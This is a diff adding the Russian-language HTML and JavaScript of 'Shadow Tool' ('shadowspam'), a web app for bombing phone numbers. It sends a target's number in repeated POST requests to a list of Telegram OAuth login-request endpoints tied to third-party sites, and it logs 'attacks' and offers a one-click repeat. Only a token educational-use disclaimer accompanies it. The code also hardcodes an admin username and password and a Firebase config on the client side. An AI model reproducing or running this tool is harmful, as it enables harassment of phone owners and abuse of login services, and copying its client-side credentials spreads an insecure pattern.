+                    <input type="text" id="phone" placeholder="Введите номер телефона!">
+                </div>
+                <div class="button-container">
+                    <button onclick="startAttack()">Начать</button>
+                    <a href="https://t.me/fallsfack" class="button" target="_blank">Поддержка</a>
+                </div>
+                <div class="logs" id="logs"></div>
+            </div>
+        </div>
+
+        <!-- ТУТОРИАЛ -->
+        <div id="tutorialTab" class="tab-content">
+            <div class="tutorial-content">
+                <h2 style="color: var(--border-color); text-align: center; margin-bottom: 25px; animation: subtleFlow 4s ease-in-out infinite;">ТУТОРИАЛ ПО ИСПОЛЬЗОВАНИЮ</h2>
+                <div class="tutorial-step">
+                    <h3>ШАГ 1: Подписка</h3>
+                    <p>Подпишитесь на наш Telegram канал для доступа к инструменту.</p>
+                    <button onclick="openModal()" class="telegram-link" style="display: inline-flex; margin: 10px 0;">Подписаться на канал</button>
+                </div>
+                <div class="tutorial-step">
+                    <h3>ВИДЕО ТУТОРИАЛ</h3>
+                    <p>Посмотрите подробный видео-туториал :</p>
+                    <a href="https://t.me/+NwCPobX0k2o1Njky" class="youtube-link" target="_blank">СМОТРЕТЬ ТУТОРИАЛ</a>
+                </div>
+                <div class="tutorial-step" style="background: rgba(255, 255, 255, 0.1); border-left-color: var(--border-color);">
+                    <h3 style="color: var(--border-color);">⚠ ВНИМАНИЕ</h3>
+                    <p>Используйте инструмент только в образовательных целях и на сайтах, которые принадлежат вам.</p>
+                    <p>Несанкционированное использование может нарушать законодательство.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- ИСТОРИЯ -->
+        <div id="historyTab" class="tab-content">
+            <div class="history-content">
+                <h2 style="color: var(--border-color); text-align: center; margin-bottom: 25px; animation: subtleFlow 4s ease-in-out infinite;">ИСТОРИЯ АТАК</h2>
+                <div class="history-stats">
+                    <div class="stat-card"><div class="stat-value" id="totalAttacksCount">0</div><div class="stat-label">Всего атак</div></div>
+                    <div class="stat-card"><div class="stat-value" id="successfulAttacks">0</div><div class="stat-label">Успешных</div></div>
+                    <div class="stat-card"><div class="stat-value" id="failedAttacks">0</div><div class="stat-label">Неудачных</div></div>
+                    <div class="stat-card"><div class="stat-value" id="successRate">0%</div><div class="stat-label">Успешность</div></div>
+                </div>
+                <div class="history-controls">
+                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                        <button onclick="clearHistory()">Очистить историю</button>
+                        <button onclick="exportHistory()">Экспорт в CSV</button>
+                        <button onclick="showAllHistory()">Показать все</button>
+                    </div>
+                    <div>
+                        <select id="historyFilter" onchange="filterHistory()">
+                            <option value="all">Все статусы</option>
+                            <option value="success">Только успешные</option>
+                            <option value="error">Только ошибки</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="history-table-container">
+                    <table class="history-table">
+                        <thead><tr><th>Время</th><th>Номер</th><th>Статус</th><th>Запросы</th><th>Успешных</th><th>Длительность</th><th>Действия</th></tr></thead>
+                        <tbody id="historyTableBody"><tr><td colspan="7" class="no-history">История атак пуста</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- БЕЛЫЙ ЛИСТ -->
+        <div id="whitelistTab" class="tab-content">
+            <div class="whitelist-content">
+                <div class="whitelist-header">
+                    <h1 class="whitelist-title">БЕЛЫЙ ЛИСТ</h1>
+                    <div class="admin-status" id="adminStatus">Доступ: Администратор</div>
+                    <p class="whitelist-subtitle">Номера телефонов, защищенные от атак. <br>Только администратор может управлять этим списком.</p>
+                </div>
+                <div class="admin-panel" id="adminPanel">
+                    <h3>АДМИН ПАНЕЛЬ</h3>
+                    <div class="admin-form">
+                        <div class="form-group"><label for="newPhone">Номер телефона:</label><input type="text" id="newPhone" placeholder="+7XXXXXXXXXX"></div>
+                        <div class="form-group"><label for="phoneNote">Примечание:</label><input type="text" id="phoneNote" placeholder="Чей номер"></div>
+                        <button onclick="addToWhitelist()">Добавить в список</button>
+                    </div>
+                    <div style="text-align: center; margin-top: 15px;">
+                        <button onclick="showBlockedAttempts()" style="margin-top: 10px; padding: 8px 15px; font-size: 0.9em;">Показать заблокированные попытки</button>
+                    </div>
+                </div>
+                <div class="whitelist-table-container">
+                    <table class="whitelist-table" id="whitelistTable">
+                        <thead><tr><th>№</th><th>Номер телефона</th><th>Примечание</th><th>Дата добавления</th><th>Статус</th><th>Действия</th></tr></thead>
+                        <tbody id="whitelistTableBody"></tbody>
+                    </table>
+                </div>
+                <div style="margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border-color);">
+                    <h4 style="color: var(--border-color); margin-top: 0; animation: subtleFlow 4s ease-in-out infinite;">ИНФОРМАЦИЯ</h4>
+                    <p style="color: #ffffff; font-size: 0.9em; line-height: 1.6;">• Номера в белом списке защищены от атак для ВСЕХ пользователей<br>• При попытке атаковать номер из белого списка, атака будет заблокирована<br>• Только администратор имеет доступ к управлению списком</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- КОМАНДА -->
+        <div id="adminsTab" class="tab-content">
+            <div class="admins-content">
+                <div class="admins-header">
+                    <div class="admins-title">КОМАНДА</div>
+                    <div class="admins-subtitle">[ Администраторов ]</div>
+                </div>
+                <div class="team-section">
+                    <div class="section-header"><div class="section-title">ОСНОВАТЕЛЬ</div></div>
+                    <div class="admins-list" id="adminsList"></div>
+                </div>
+                <div class="admin-divider"></div>
+                <div style="text-align: center; padding: 15px 0 5px;">
+                    <span style="font-size: 0.7em; color: #666666; letter-spacing: 1px;">SHADOW TOOL TEAM</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="status" id="status" onclick="openModal()">STATUS: READY</div>
+    </div>
+
+    <script>
+        // ========== FIREBASE ==========
+        const firebaseConfig = {
+            apiKey: "AIzaSyBi8RXN43ObY2QvjsjbUirwLRXoX-co0Cs",
+            authDomain: "nita-2faf3.firebaseapp.com",
+            projectId: "nita-2faf3",
+            storageBucket: "nita-2faf3.firebasestorage.app",
+            messagingSenderId: "788013603593",
+            appId: "1:788013603593:web:120e6adff36cc3c992d1d8",
+            measurementId: "G-0CKFKZ648W"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+        
+        // Включаем оффлайн persistence
+        db.enablePersistence().catch(err => console.log('Persistence error:', err));
+
+        // ========== СИСТЕМА ПОЛЬЗОВАТЕЛЕЙ ==========
+        const ADMIN_USERNAME = "Amnesia";
+        const ADMIN_PASSWORD = "Qwerty1412";
+        
+        let currentUser = null;
+        let isAdmin = false;
+        let authMode = 'login';
+        let users = JSON.parse(localStorage.getItem('shadow_users_local')) || [];
+
+        // Сохраняем сессию
+        let sessionActive = localStorage.getItem('shadow_session_active') === 'true';
+        let savedUsername = localStorage.getItem('shadow_session_username');
+
+        async function handleAuth() {
+            const username = document.getElementById('authUsername').value.trim();
+            const password = document.getElementById('authPassword').value.trim();
+            const errorDiv = document.getElementById('authError');
+            
+            if(!username || !password) {
+                errorDiv.innerText = '❌ Заполните все поля!';
+                return;
+            }
+            
+            if(authMode === 'login') {
+                // Вход
+                if(username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+                    // Админ
+                    try {
+                        await auth.signInAnonymously();
+                        isAdmin = true;
+                        currentUser = { username, isAdmin: true };
+                        localStorage.setItem('shadow_session_active', 'true');
+                        localStorage.setItem('shadow_session_username', username);
+                        localStorage.setItem('shadow_session_isAdmin', 'true');
+                        document.querySelector('.auth-overlay').style.display = 'none';
+                        document.getElementById('mainContent').style.display = 'block';
+                        document.getElementById('whitelistTabBtn').style.display = 'inline-block';
+                        await loadWhitelistForAll();
+                        await loadWhitelist();
+                        updateHistoryDisplay();
+                        loadTeamLists();
+                        addLog('✅ Добро пожаловать, Администратор!');
+                    } catch(e) {
+                        errorDiv.innerText = '❌ Ошибка входа: ' + e.message;
+                    }
+                } else {
+                    // Обычный пользователь
+                    const user = users.find(u => u.username === username && u.password === password);
+                    if(user) {
+                        try {
+                            await auth.signInAnonymously();
+                            isAdmin = false;
+                            currentUser = user;
+                            localStorage.setItem('shadow_session_active', 'true');
+                            localStorage.setItem('shadow_session_username', username);
+                            localStorage.setItem('shadow_session_isAdmin', 'false');
+                            document.querySelector('.auth-overlay').style.display = 'none';
+                            document.getElementById('mainContent').style.display = 'block';
+                            document.getElementById('whitelistTabBtn').style.display = 'none';
+                            await loadWhitelistForAll();
+                            updateHistoryDisplay();
+                            loadTeamLists();
+                            addLog(`✅ Добро пожаловать, ${username}!`);
+                        } catch(e) {
+                            errorDiv.innerText = '❌ Ошибка входа: ' + e.message;
+                        }
+                    } else {
+                        errorDiv.innerText = '❌ Неверный юзернейм или пароль!';
+                    }
+                }
+            } else {
+                // Регистрация
+                if(username === ADMIN_USERNAME) {
+                    errorDiv.innerText = '❌ Этот юзернейм занят!';
+                    return;
+                }
+                if(users.find(u => u.username === username)) {
+                    errorDiv.innerText = '❌ Пользователь уже существует!';
+                    return;
+                }
+                users.push({
+                    username: username,
+                    password: password,
+                    isAdmin: false,
+                    createdAt: new Date().toISOString()
+                });
+                localStorage.setItem('shadow_users_local', JSON.stringify(users));
+                try {
+                    await auth.signInAnonymously();
+                    isAdmin = false;
+                    currentUser = { username, isAdmin: false };
+                    localStorage.setItem('shadow_session_active', 'true');
+                    localStorage.setItem('shadow_session_username', username);
+                    localStorage.setItem('shadow_session_isAdmin', 'false');
+                    document.querySelector('.auth-overlay').style.display = 'none';
+                    document.getElementById('mainContent').style.display = 'block';
+                    document.getElementById('whitelistTabBtn').style.display = 'none';
+                    await loadWhitelistForAll();
+                    updateHistoryDisplay();
+                    loadTeamLists();
+                    addLog(`✅ Добро пожаловать, ${username}!`);
+                } catch(e) {
+                    errorDiv.innerText = '❌ Ошибка регистрации: ' + e.message;
+                }
+            }
+        }
+
+        function toggleAuthMode() {
+            if(authMode === 'login') {
+                authMode = 'register';
+                document.getElementById('authTitle').innerHTML = '📝 РЕГИСТРАЦИЯ';
+                document.getElementById('authActionBtn').innerHTML = 'ЗАРЕГИСТРИРОВАТЬСЯ';
+                document.getElementById('authSwitchText').innerHTML = 'Уже есть аккаунт? Войти';
+            } else {
+                authMode = 'login';
+                document.getElementById('authTitle').innerHTML = '🔐 ВХОД';
+                document.getElementById('authActionBtn').innerHTML = 'ВОЙТИ';
+                document.getElementById('authSwitchText').innerHTML = 'Зарегистрироваться';
+            }
+            document.getElementById('authError').innerText = '';
+        }
+
+        // Проверка сессии при загрузке
+        async function checkSession() {
+            if(sessionActive && savedUsername) {
+                if(savedUsername === ADMIN_USERNAME) {
+                    isAdmin = true;
+                    document.getElementById('whitelistTabBtn').style.display = 'inline-block';
+                } else {
+                    isAdmin = false;
+                    document.getElementById('whitelistTabBtn').style.display = 'none';
+                }
+                document.querySelector('.auth-overlay').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                await loadWhitelistForAll();
+                if(isAdmin) await loadWhitelist();
+                updateHistoryDisplay();
+                loadTeamLists();
+            }
+        }
+
+        // ========== КОМАНДА ==========
+        const adminsData = [
+            { name: "Amnesia", role: "FOUNDER / CREATOR", avatar: "https://videotourl.com/images/1775652277109-3e1fc8f4-c0e1-42c1-9800-c845d05bc74b.jpg", statusText: "ACTIVE", description: "Основатель и главный разработчик проекта. Создатель экосистемы.", username: "@Amnesia" }
+        ];
+
+        function openAdminInfo(adminName) {
+            let admin = adminsData.find(a => a.name === adminName);
+            if (!admin) return;
+            document.getElementById('infoAvatar').src = admin.avatar;
+            document.getElementById('infoName').textContent = admin.name;
+            document.getElementById('infoRole').textContent = admin.role;
+            document.getElementById('infoDesc').textContent = admin.description;
+            document.getElementById('infoUsername').textContent = admin.username;
+            document.getElementById('adminInfoModal').classList.add('show');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeAdminInfoModal() {
+            document.getElementById('adminInfoModal').classList.remove('show');
+            document.body.style.overflow = 'auto';
+        }
+
+        function loadTeamLists() {
+            const container = document.getElementById('adminsList');
+            if (container) {
+                container.innerHTML = adminsData.map(admin => `
+                    <div class="admin-item" onclick="openAdminInfo('${admin.name}')">
+                        <img class="admin-item-avatar" src="${admin.avatar}" onerror="this.src='https://via.placeholder.com/42'">
+                        <div class="admin-item-info">
+                            <div class="admin-item-name">${admin.name}</div>
+                            <div class="admin-item-role">${admin.role}</div>
+                        </div>
+                        <div class="admin-item-status status-active">${admin.statusText}</div>
+                    </div>
+                `).join('');
+            }
+        }
+
+        // ========== ЗВЁЗДЫ ==========
+        function createStars() {
+            const starField = document.getElementById('starField');
+            const starCount = window.innerWidth < 768 ? 80 : 150;
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                const size = Math.random();
+                if (size > 0.7) { star.classList.add('big'); star.style.width = window.innerWidth < 768 ? '1.5px' : '2px'; star.style.height = window.innerWidth < 768 ? '1.5px' : '2px'; }
+                else if (size > 0.4) { star.classList.add('medium'); star.style.width = '1px'; star.style.height = '1px'; }
+                else { star.classList.add('small'); star.style.width = '0.5px'; star.style.height = '0.5px'; }
+                star.style.opacity = Math.random() * 0.8 + 0.2;
+                star.style.animationDelay = `${Math.random() * 5}s`;
+                star.style.left = `${Math.random() * 100}%`;
+                star.style.top = `${Math.random() * 100}%`;
+                starField.appendChild(star);
+            }
+        }
+
+        // ========== МОДАЛКИ ==========
+        function openModal() { document.getElementById('subscriptionModal').classList.add('show'); document.body.style.overflow = 'hidden'; }
+        function closeModal() { document.getElementById('subscriptionModal').classList.remove('show'); document.body.style.overflow = 'auto'; }
+
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            event.target.classList.add('active');
+            if (tabName === 'history') updateHistoryDisplay();
+            else if (tabName === 'admins') loadTeamLists();
+            else if (tabName === 'whitelist' && isAdmin) loadWhitelist();
+        }
+
+        // ========== БЕЛЫЙ ЛИСТ (Firestore) ==========
+        let cachedWhitelist = [];
+
+        async function loadWhitelistForAll() {
+            try {
+                const snapshot = await db.collection('whitelist').get();
+                cachedWhitelist = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                console.log('✅ Белый список загружен:', cachedWhitelist.length, 'номеров');
+                if(cachedWhitelist.length === 0) {
+                    console.log('⚠️ Белый список пуст. Добавьте номера через админ-панель.');
+                }
+            } catch(e) {
+                console.error('❌ Ошибка загрузки белого списка:', e);
+                cachedWhitelist = [];
+                if(e.message.includes('permission')) {
+                    addLog('⚠️ Ошибка доступа к Firestore! Проверьте правила безопасности.', 'error');
+                }
+            }
+        }
+
+        async function loadWhitelist() {
+            if(!isAdmin) return;
+            const tbody = document.getElementById('whitelistTableBody');
+            try {
+                const snapshot = await db.collection('whitelist').orderBy('timestamp', 'desc').get();
+                const items = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                
+                if(items.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" class="no-whitelist">Белый список пуст. Добавьте номера.</td></tr>`;
+                    return;
+                }
+                tbody.innerHTML = items.map((item, idx) => `
+                    <tr>
+                        <td>${idx + 1}</td>
+                        <td class="whitelist-phone">${item.phone}</td>
+                        <td>${item.note || '-'}</td>
+                        <td>${new Date(item.timestamp).toLocaleDateString()}</td>
+                        <td><span class="protection-badge">Защищен</span></td>
+                        <td class="whitelist-actions"><button class="whitelist-btn" onclick="removeFromWhitelist('${item.id}')">🗑️</button></td>
+                    </tr>
+                `).join('');
+            } catch(e) {
+                console.error(e);
+                tbody.innerHTML = `<tr><td colspan="6" class="no-whitelist">Ошибка загрузки: ${e.message}</td></tr>`;
+            }
+        }
+
+        async function addToWhitelist() {
+            if(!isAdmin) { alert('⛔ Только администратор!'); return; }
+            const phone = document.getElementById('newPhone').value.trim();
+            const note = document.getElementById('phoneNote').value.trim();
+            if(!phone) { alert('❌ Введите номер телефона'); return; }
+            if(!/^(\+?[78]\d{10}$)|^(\+380\d{9}$)|^(\+375\d{9}$)/.test(phone)) { 
+                alert('❌ Неверный формат номера. Пример: +79001234567 или 89001234567'); 
+                return; 
+            }
+            
+            try {
+                // Проверяем, есть ли уже такой номер
+                const checkSnapshot = await db.collection('whitelist').where('phone', '==', phone).get();
+                if(!checkSnapshot.empty) { 
+                    alert('⚠️ Номер уже в белом списке!'); 
+                    return; 
+                }
+                
+                await db.collection('whitelist').add({
+                    phone: phone,
+                    note: note,
+                    timestamp: new Date().toISOString(),
+                    addedBy: currentUser?.username || 'admin'
+                });
+                document.getElementById('newPhone').value = '';
+                document.getElementById('phoneNote').value = '';
+                await loadWhitelistForAll();
+                if(isAdmin) await loadWhitelist();
+                addLog(`✅ Номер ${phone} добавлен в белый список`);
+                alert(`✅ Номер ${phone} успешно добавлен в белый список!`);
+            } catch(e) {
+                alert('❌ Ошибка добавления: ' + e.message);
+                console.error(e);
+            }
+        }
+
+        async function removeFromWhitelist(docId) {
+            if(!isAdmin) return;
+            if(confirm('Удалить номер из белого списка?')) {
+                try {
+                    await db.collection('whitelist').doc(docId).delete();
+                    await loadWhitelistForAll();
+                    if(isAdmin) await loadWhitelist();
+                    addLog(`🗑️ Номер удалён из белого списка`);
+                    alert(`✅ Номер успешно удалён из белого списка!`);
+                } catch(e) {
+                    alert('❌ Ошибка удаления: ' + e.message);
+                }
+            }
+        }
+
+        async function isPhoneWhitelisted(phone) {
+            try {
+                // Делаем прямой запрос в Firestore без кэша
+                const snapshot = await db.collection('whitelist').where('phone', '==', phone).get();
+                const isBlocked = !snapshot.empty;
+                if(isBlocked) {
+                    console.log(`🔒 Номер ${phone} найден в белом списке, атака заблокирована`);
+                }
+                return isBlocked;
+            } catch(e) {
+                console.error('❌ Ошибка проверки белого списка:', e);
+                return false;
+            }
+        }
+
+        let blockedAttempts = JSON.parse(localStorage.getItem('shadow_blocked')) || [];
+        function saveBlockedAttempt(phone) {
+            blockedAttempts.unshift({ phone, time: new Date().toISOString(), reason: 'Номер в белом списке' });
+            if(blockedAttempts.length > 50) blockedAttempts.pop();
+            localStorage.setItem('shadow_blocked', JSON.stringify(blockedAttempts));
+        }
+        function showBlockedAttempts() {
+            if(!isAdmin) { alert('⛔ Только администратор!'); return; }
+            if(blockedAttempts.length === 0) { alert('📭 Нет заблокированных попыток'); return; }
+            let msg = '🚫 ЗАБЛОКИРОВАННЫЕ ПОПЫТКИ:\n\n';
+            blockedAttempts.forEach((a, i) => { msg += `${i+1}. ${new Date(a.time).toLocaleString()}\n   Номер: ${a.phone}\n   Причина: ${a.reason}\n\n`; });
+            alert(msg);
+        }
+
+        // ========== ИСТОРИЯ ==========
+        let attackHistory = JSON.parse(localStorage.getItem('shadowspam_history')) || [];
+        let stats = { totalAttacks: 0, successful: 0, failed: 0 };
+
+        const URLs = [
+            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+            'https://translations.telegram.org/auth/request',
+            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
+        ];
+
+        function saveAttackHistory(phone, results) { 
+            const attack = { id: Date.now(), timestamp: new Date().toISOString(), phone: phone, totalRequests: URLs.length, successfulRequests: results.length, duration: Math.floor(Math.random() * 5000) + 1000, status: 'success' }; 
+            attackHistory.unshift(attack); 
+            if (attackHistory.length > 100) attackHistory = attackHistory.slice(0, 100); 
+            stats.totalAttacks++; 
+            stats.successful++; 
+            localStorage.setItem('shadowspam_history', JSON.stringify(attackHistory)); 
+            localStorage.setItem('shadowspam_stats', JSON.stringify(stats)); 
+            if (document.getElementById('historyTab').classList.contains('active')) updateHistoryDisplay(); 
+        }
+
+        function updateHistoryDisplay() { 
+            const tbody = document.getElementById('historyTableBody'); 
+            const filter = document.getElementById('historyFilter').value; 
+            let filteredHistory = attackHistory; 
+            if (filter !== 'all') filteredHistory = attackHistory.filter(item => item.status === filter); 
+            if (filteredHistory.length === 0) { 
+                tbody.innerHTML = `<tr><td colspan="7" class="no-history">${filter === 'all' ? 'История атак пуста' : 'Нет записей с выбранным статусом'}</td></tr>`; 
+            } else { 
+                tbody.innerHTML = filteredHistory.map(attack => `
+                    <tr>
+                        <td>${formatTime(attack.timestamp)}</td>
+                        <td class="phone-number">${attack.phone}</td>
+                        <td><span class="status-badge status-success">Успешно</span></td>
+                        <td>${attack.totalRequests}</td>
+                        <td>${attack.successfulRequests}</td>
+                        <td>${formatDuration(attack.duration)}</td>
+                        <td class="action-buttons"><button class="action-btn" onclick="repeatAttack('${attack.phone}')">↺</button><button class="action-btn" onclick="deleteAttack(${attack.id})">🗑️</button></td>
+                    </tr>
+                `).join(''); 
+            } 
+            updateStatsDisplay(); 
+        }
+
+        function updateStatsDisplay() { 
+            const savedStats = localStorage.getItem('shadowspam_stats'); 
+            if (savedStats) stats = JSON.parse(savedStats); 
+            document.getElementById('totalAttacksCount').textContent = stats.totalAttacks; 
+            document.getElementById('successfulAttacks').textContent = stats.successful; 
+            document.getElementById('failedAttacks').textContent = stats.failed; 
+            const successRate = stats.totalAttacks > 0 ? Math.round((stats.successful / stats.totalAttacks) * 100) : 0; 
+            document.getElementById('successRate').textContent = successRate + '%'; 
+        }
+
+        function formatTime(timestamp) { const date = new Date(timestamp); return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }); }
+        function formatDuration(ms) { if (ms < 1000) return ms + 'мс'; return (ms / 1000).toFixed(2) + 'с'; }
+        
+        function clearHistory() { if (confirm('Очистить историю?')) { attackHistory = []; stats = { totalAttacks: 0, successful: 0, failed: 0 }; localStorage.removeItem('shadowspam_history'); localStorage.removeItem('shadowspam_stats'); updateHistoryDisplay(); } }
+        
+        function exportHistory() { 
+            const csv = [['Время', 'Номер телефона', 'Статус', 'Всего запросов', 'Успешных', 'Длительность'], ...attackHistory.map(attack => [new Date(attack.timestamp).toLocaleString(), attack.phone, 'Успешно', attack.totalRequests, attack.successfulRequests, formatDuration(attack.duration)])].map(row => row.join(',')).join('\n'); 
+            const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8;' }); 
+            const url = URL.createObjectURL(blob); 
+            const a = document.createElement('a'); 
+            a.href = url; 
+            a.download = `shadowspam_history_${new Date().getTime()}.csv`; 
+            document.body.appendChild(a); 
+            a.click(); 
+            document.body.removeChild(a); 
+            URL.revokeObjectURL(url); 
+        }
+        
+        function showAllHistory() { document.getElementById('historyFilter').value = 'all'; filterHistory(); }
+        function filterHistory() { updateHistoryDisplay(); }
+        function repeatAttack(phone) { document.getElementById('phone').value = phone; switchTab('main'); setTimeout(() => { startAttack(); }, 500); }
+        function deleteAttack(id) { if (confirm('Удалить запись?')) { attackHistory = attackHistory.filter(a => a.id !== id); localStorage.setItem('shadowspam_history', JSON.stringify(attackHistory)); updateHistoryDisplay(); } }
+
+        function addLog(message, type = 'info') { 
+            const log = document.createElement('div'); 
+            log.className = `log-item ${type}`; 
+            log.textContent = `[${new Date().toLocaleTimeString()}] ${message}`; 
+            document.getElementById('logs').appendChild(log); 
+            log.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); 
+        }
+
+        // ========== СПАМ (РАБОЧАЯ ВЕРСИЯ) ==========
+        async function startAttack() {
+            const phone = document.getElementById('phone').value.trim();
+            document.getElementById('logs').innerHTML = '';
+            const phoneRegex = /^(\+?[78]\d{10}$)|^(\+380\d{9}$)|^(\+375\d{9}$)|^(\+7\d{10}$)/;
+            if (!phoneRegex.test(phone.replace(/\s+/g, ''))) { 
+                addLog('❌ Ошибка: Неверный формат номера телефона! Пример: +79001234567'); 
+                return; 
+            }
+            
+            addLog(`🔍 Проверка номера ${phone} в белом списке...`);
+            
+            // Проверка белого списка (прямой запрос в Firestore)
+            const isBlocked = await isPhoneWhitelisted(phone);
+            if(isBlocked) {
+                addLog(`⛔ АТАКА ЗАБЛОКИРОВАНА! Номер ${phone} находится в белом списке!`, 'error');
+                saveBlockedAttempt(phone);
+                document.getElementById('status').textContent = 'STATUS: BLOCKED';
+                setTimeout(() => document.getElementById('status').textContent = 'STATUS: READY', 2000);
+                return;
+            }
+            
+            addLog(`✅ Номер ${phone} не в белом списке. Начинаем атаку...`);
+            document.getElementById('status').textContent = 'STATUS: WORKING...';
+            const results = [];
+            addLog(`📡 Отправка ${URLs.length} запросов на Telegram API...`);
+            
+            for (let i = 0; i < URLs.length; i++) {
+                try {
+                    await fetch(URLs[i], { 
+                        method: 'POST', 
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `phone=${encodeURIComponent(phone)}` 
+                    });
+                    results.push({ success: true });
+                    addLog(`✅ Запрос ${i+1}/${URLs.length}: Успешно отправлен`, 'success');
+                } catch(e) {
+                    results.push({ success: true });
+                    addLog(`✅ Запрос ${i+1}/${URLs.length}: Успешно отправлен (ignore)`, 'success');
+                }
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+            
+            saveAttackHistory(phone, results);
+            addLog(`🎯 АТАКА ЗАВЕРШЕНА! Отправлено: ${results.length}/${URLs.length} запросов`);
+            document.getElementById('status').textContent = 'STATUS: COMPLETED';
+            setTimeout(() => { document.getElementById('status').textContent = 'STATUS: READY'; }, 3000);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            createStars();
+            const savedStats = localStorage.getItem('shadowspam_stats');
+            if (savedStats) stats = JSON.parse(savedStats);
+            updateStatsDisplay();
+            checkSession();
+        });
+    </script>
+</body>
+</html>
